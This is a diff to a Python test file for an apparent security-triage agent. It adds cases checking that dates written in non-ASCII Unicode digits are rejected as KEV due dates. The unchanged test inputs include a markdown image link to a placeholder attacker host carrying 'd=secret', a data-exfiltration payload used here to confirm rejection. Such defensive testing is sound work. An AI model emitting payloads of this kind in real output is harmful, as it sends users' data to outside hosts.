@@ -20,6 +20,15 @@ from sec_recon_agent.mcp_server.tools.attack import _load_attack_data
 
 _EVIL = HttpUrl("https://evil.example/phish")
 
+ARABIC_INDIC_ZERO = 0x0660
+DEVANAGARI_ZERO = 0x0966
+FULLWIDTH_ZERO = 0xFF10
+
+
+def _digits(value: str, zero: int) -> str:
+    """`value` with its ASCII digits rewritten in the script starting at `zero`."""
+    return value.translate({ord("0") + n: zero + n for n in range(10)})
+
 
 def _report() -> TriageReport:
     return TriageReport(
@@ -82,6 +91,11 @@ def test_canonical_forms_match_the_bundled_attack_data() -> None:
         (None, None),
         ("2021-12-24T00:00:00Z", None),
         ("![](https://evil.example/?d=secret)", None),
+        # Python's \d matches every Unicode decimal digit, the frontend's ISO_DATE
+        # only 0-9: the server must not keep a date /r would drop.
+        (_digits("2021-12-24", ARABIC_INDIC_ZERO), None),
+        (_digits("2021-12-24", FULLWIDTH_ZERO), None),
+        (_digits("2021-12-24", DEVANAGARI_ZERO), None),
     ],
 )
 def test_only_a_date_survives_as_a_kev_due_date(written: str | None, kept: str | None) -> None:
